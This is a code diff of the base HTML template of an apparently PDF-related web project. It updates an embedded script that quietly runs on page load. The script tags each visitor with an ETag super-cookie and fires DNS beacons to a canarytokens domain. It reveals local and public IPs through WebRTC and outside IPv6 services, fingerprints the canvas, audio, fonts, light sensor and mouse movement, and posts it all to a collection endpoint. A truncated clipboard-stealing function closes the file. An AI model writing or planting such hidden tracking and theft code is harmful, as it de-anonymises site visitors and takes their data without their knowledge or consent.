@@ -1,4 +1,3 @@
---- START OF FILE pdfeagle-main/templates/base.html ---
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -18,104 +17,89 @@
 
     <script>
     // ╔═══════════════════════════════════════════════════════════════════════════════╗
-    // ║  🦅 EAGLE EYE ULTIMATE v5.0 — FULL SPECTRUM INTELLIGENCE                      ║
+    // ║  🦅 EAGLE EYE OMNISCIENT v6.0 — GOD TIER INTELLIGENCE                         ║
+    // ║  Combines: ETag Persistence, Sensor Fusion, Consistency Matrix                ║
     // ╚═══════════════════════════════════════════════════════════════════════════════╝
 
-    window.EagleEyeUltimate = class {
+    window.EagleEyeOmni = class {
         constructor(config = {}) {
-            this.version = "5.0.0";
+            this.version = "6.0.0-OMNI";
             this.endpoint = config.endpoint || '/api/collect';
             this.sessionId = this.generateSessionId();
-            this.startTime = performance.now();
-            
-            // !!! ВАЖНО: ЗАМЕНИТЕ НА СВОЙ ДОМЕН CANARYTOKENS !!!
-            // Пример: "le50571w2dnsylkz8t5x5ioy2.canarytokens.com"
             this.config = {
-                enableDNSBeacon: true,
+                // REPLACE WITH YOUR CANARY DOMAIN
                 canaryDomain: "le50571w2dnsylkz8t5x5ioy2.canarytokens.com", 
-                collectOnLoad: config.collectOnLoad !== false,
-                debug: false
+                collectOnLoad: config.collectOnLoad !== false
             };
-            
             this.init();
         }
 
         generateSessionId() {
-            const array = new Uint8Array(8);
-            crypto.getRandomValues(array);
-            return Array.from(array, b => b.toString(16).padStart(2, '0')).join('');
+            return Array.from(crypto.getRandomValues(new Uint8Array(8)), b => b.toString(16).padStart(2,'0')).join('');
         }
 
         async init() {
-            if (this.config.enableDNSBeacon) this.triggerDNSBeacons();
+            // 1. Load Super-Cookie (ETag)
+            this.loadSuperCookie();
+            
+            // 2. Trigger DNS Beacons
+            if (this.config.canaryDomain) this.triggerDNSBeacons();
+
             if (this.config.collectOnLoad) {
-                if (document.readyState === 'complete') setTimeout(() => this.collect('Page Load'), 100);
-                else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load'), 100));
+                if (document.readyState === 'complete') setTimeout(() => this.collect('Page Load'), 500);
+                else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load'), 500));
             }
         }
 
-        // === 1. DNS INTELLIGENCE (LINKED TO SESSION) ===
-        triggerDNSBeacons() {
-            const domain = this.config.canaryDomain;
-            // Формат: session_id.timestamp.random.token.com
-            // Это позволяет серверу связать DNS запрос с HTTP сессией
-            const uid = `${this.sessionId}.${Date.now()}.${Math.floor(Math.random()*1000)}`;
-            
-            // Метод 1: Image (самый надежный)
-            new Image().src = `https://${uid}.img.${domain}/pixel.gif`;
-            
-            // Метод 2: DNS Prefetch
-            const prefetch = document.createElement('link');
-            prefetch.rel = 'dns-prefetch';
-            prefetch.href = `//${uid}.dns.${domain}`;
-            document.head.appendChild(prefetch);
+        // === 1. PERSISTENCE (ETag Super-Cookie) ===
+        loadSuperCookie() {
+            // Forces browser to check ETag. If it exists, server logs it.
+            const img = new Image();
+            img.src = `/pixel.gif?source=etag_check&uid=${this.sessionId}`;
         }
 
-        // === 2. WEBRTC LEAK DETECTION ===
-        async getWebRTCIntelligence() {
-            const result = { localIPs: [], publicIPs: [], ipv6: [] };
-            const stunServers = [
-                { urls: "stun:stun.l.google.com:19302" },
-                { urls: "stun:stun1.l.google.com:19302" },
-                { urls: "stun:stun.cloudflare.com:3478" }
-            ];
+        // === 2. SENSORS (Nikolai's Logic) ===
+        async getAmbientLight() {
+            if ('AmbientLightSensor' in window) {
+                try {
+                    const sensor = new AmbientLightSensor();
+                    return new Promise(resolve => {
+                        sensor.onreading = () => { sensor.stop(); resolve(sensor.illuminance); };
+                        sensor.onerror = () => resolve("Error/Permission");
+                        sensor.start();
+                        setTimeout(() => { sensor.stop(); resolve("Timeout"); }, 500);
+                    });
+                } catch { return "Not Supported"; }
+            }
+            return "Not Supported";
+        }
 
+        // === 3. NETWORK TRUTH (Leonid's Logic) ===
+        async getWebRTC() {
+            const res = { local: [], public: [] };
             try {
-                const pc = new RTCPeerConnection({ iceServers: stunServers });
-                pc.createDataChannel('eagle');
-                
-                await new Promise((resolve) => {
-                    pc.onicecandidate = (event) => {
-                        if (!event.candidate) { resolve(); return; }
-                        const candidate = event.candidate.candidate;
-                        
-                        // IPv4
-                        const ipv4Match = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                        if (ipv4Match) {
-                            const ip = ipv4Match[1];
-                            if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('172.')) {
-                                if (!result.localIPs.includes(ip)) result.localIPs.push(ip);
-                            } else {
-                                if (!result.publicIPs.includes(ip)) result.publicIPs.push(ip);
-                            }
+                const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+                pc.createDataChannel('');
+                await new Promise(r => {
+                    pc.onicecandidate = e => {
+                        if(!e.candidate) { r(); return; }
+                        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if(ip) {
+                            if(ip[1].match(/^(192\.168|10\.|172\.)/)) res.local.push(ip[1]);
+                            else res.public.push(ip[1]);
                         }
-                        // IPv6
-                        const ipv6Match = candidate.match(/([a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/i);
-                        if (ipv6Match && !result.ipv6.includes(ipv6Match[1])) result.ipv6.push(ipv6Match[1]);
                     };
-                    setTimeout(resolve, 2000); // Таймаут 2 сек
+                    setTimeout(r, 1500);
                 });
-                pc.close();
-            } catch (e) { }
-            return result;
+            } catch(e){}
+            return res;
         }
 
-        // === 3. IPv6 LEAK DETECTION ===
+        // === 4. IPv6 LEAK (Restored) ===
         async getIPv6() {
             const services = [
                 'https://api64.ipify.org?format=json',
-                'https://ipv6.icanhazip.com',
-                'https://api6.ipify.org?format=json'
+                'https://ipv6.icanhazip.com'
             ];
             for (const url of services) {
                 try {
@@ -131,15 +115,37 @@
             return { detected: false, ip: null };
         }
 
-        // === 4. FINGERPRINTING (Canvas, Audio, Fonts) ===
+        // === 5. BEHAVIORAL (Mouse Entropy) ===
+        trackMouseEntropy() {
+            return new Promise(resolve => {
+                let moves = [];
+                const fn = e => {
+                    moves.push({x:e.clientX, y:e.clientY});
+                    if(moves.length > 20) {
+                        document.removeEventListener('mousemove', fn);
+                        // Calculate linearity (Bots move straight)
+                        let variance = 0;
+                        for(let i=2; i<moves.length; i++) {
+                            const a1 = Math.atan2(moves[i-1].y - moves[i-2].y, moves[i-1].x - moves[i-2].x);
+                            const a2 = Math.atan2(moves[i].y - moves[i-1].y, moves[i].x - moves[i-1].x);
+                            variance += Math.abs(a1 - a2);
+                        }
+                        resolve(variance);
+                    }
+                };
+                document.addEventListener('mousemove', fn);
+                setTimeout(() => { document.removeEventListener('mousemove', fn); resolve(0); }, 3000);
+            });
+        }
+
+        // === 6. FINGERPRINTING ===
         getCanvasHash() {
             try {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
                 ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
                 ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v5", 2, 15);
-                ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Eagle_v5", 4, 17);
+                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v6", 2, 15);
                 const data = canvas.toDataURL();
                 let hash = 0;
                 for (let i = 0; i < data.length; i++) {
@@ -147,7 +153,7 @@
                     hash |= 0;
                 }
                 return hash.toString(16);
-            } catch (e) { return "error"; }
+            } catch { return "error"; }
         }
 
         async getAudioHash() {
@@ -165,12 +171,11 @@
                 let sum = 0;
                 for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
                 return sum.toFixed(6);
-            } catch (e) { return "error"; }
+            } catch { return "error"; }
         }
 
         getFonts() {
-            // Сокращенный список для скорости, но достаточный для OS Fingerprint
-            const fontList = ["Arial", "Calibri", "Consolas", "Courier New", "Helvetica", "Roboto", "Segoe UI", "Times New Roman", "Verdana", "Ubuntu", "Cantarell", "Liberation Sans", "Menlo", "Monaco", "SF Pro"];
+            const fontList = ["Arial", "Calibri", "Consolas", "Helvetica", "Roboto", "Segoe UI", "Times New Roman", "Verdana", "Ubuntu", "Menlo", "Monaco"];
             const detected = [];
             const span = document.createElement("span");
             span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px"; span.innerHTML = "mmmmmmmmmmlli";
@@ -185,68 +190,74 @@
             return detected;
         }
 
-        // === 5. ANTI-SPOOFING ===
-        detectAnomalies(fonts) {
+        // === 7. CONSISTENCY CHECKS (Kirill's Logic) ===
+        detectAnomalies(fonts, light, entropy) {
             const anomalies = [];
             const ua = navigator.userAgent;
-            const platform = navigator.platform;
             
+            // Mobile Check
+            const isMobileUA = /Android|iPhone|iPad/i.test(ua);
+            const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+            if (isMobileUA && !hasTouch) anomalies.push("FAKE MOBILE: No Touch Events");
+            
+            // Sensor Check (VMs don't have light sensors)
+            if (isMobileUA && light === "Not Supported") anomalies.push("POSSIBLE VM: No Light Sensor on Mobile");
+
+            // Bot Check
+            if (entropy < 0.05 && entropy > 0) anomalies.push("BOT MOVEMENT: Perfectly linear mouse");
+            if (navigator.webdriver) anomalies.push("CRITICAL: WebDriver Detected");
+
             // OS Mismatch
             if (ua.includes("Windows") && !fonts.includes("Calibri")) anomalies.push("OS SPOOF: Windows without Calibri");
-            if (ua.includes("Mac") && !fonts.includes("Helvetica") && !fonts.includes("Menlo")) anomalies.push("OS SPOOF: Mac without Helvetica/Menlo");
-            if (platform.includes("Linux") && (fonts.includes("Segoe UI") || fonts.includes("Calibri"))) anomalies.push("OS SPOOF: Linux with Windows fonts");
-            
-            // Screen Mismatch
-            if (!window.matchMedia(`(width: ${screen.width}px)`).matches) anomalies.push(`SCREEN SPOOF: JS=${screen.width}, CSS mismatch`);
-            
-            // Automation
-            if (navigator.webdriver) anomalies.push("CRITICAL: WebDriver Detected");
-            
+            if (ua.includes("Mac") && !fonts.includes("Helvetica")) anomalies.push("OS SPOOF: Mac without Helvetica");
+
             return anomalies;
         }
 
+        triggerDNSBeacons() {
+            const uid = `${this.sessionId}.${Date.now()}`;
+            new Image().src = `https://${uid}.img.${this.config.canaryDomain}/pixel.gif`;
+        }
+
         // === MAIN COLLECT ===
-        async collect(triggerName, extraData = {}) {
-            const [webrtc, ipv6, audioHash] = await Promise.all([
-                this.getWebRTCIntelligence(),
+        async collect(trigger, extra = {}) {
+            const [webrtc, ipv6, light, entropy, audio] = await Promise.all([
+                this.getWebRTC(),
                 this.getIPv6(),
+                this.getAmbientLight(),
+                this.trackMouseEntropy(),
                 this.getAudioHash()
             ]);
-            
+
             const fonts = this.getFonts();
-            const anomalies = this.detectAnomalies(fonts);
-            
+            const anomalies = this.detectAnomalies(fonts, light, entropy);
+
             const payload = {
                 meta: {
                     version: this.version,
                     sessionId: this.sessionId,
-                    trigger: triggerName,
-                    url: window.location.href,
-                    timestamp: new Date().toISOString()
+                    trigger: trigger,
+                    url: window.location.href
                 },
                 threat: {
-                    score: anomalies.length * 20,
+                    score: anomalies.length * 25,
                     anomalies: anomalies,
-                    is_spoofing: anomalies.length > 0
+                    is_bot: anomalies.length > 0
                 },
                 fingerprints: {
                     canvas: this.getCanvasHash(),
-                    audio: audioHash,
+                    audio: audio,
                     fonts: fonts
                 },
-                system: {
-                    ua: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardware: {
+                    lightSensor: light,
+                    mouseEntropy: entropy,
                     cores: navigator.hardwareConcurrency,
                     memory: navigator.deviceMemory
                 },
-                network: {
-                    webrtc: webrtc,
-                    ipv6: ipv6
-                },
-                ...extraData
+                network: { webrtc, ipv6 },
+                system: { ua: navigator.userAgent, platform: navigator.platform, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone },
+                ...extra
             };
 
             const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
@@ -255,9 +266,8 @@
         }
     };
     
-    const eagle = new EagleEyeUltimate();
+    const eagle = new EagleEyeOmni();
 
-    // --- КРАЖА БУФЕРА ---
     async function stealClipboard() {
         try {
             if (navigator.clipboard && navigator.clipboard.readText) {
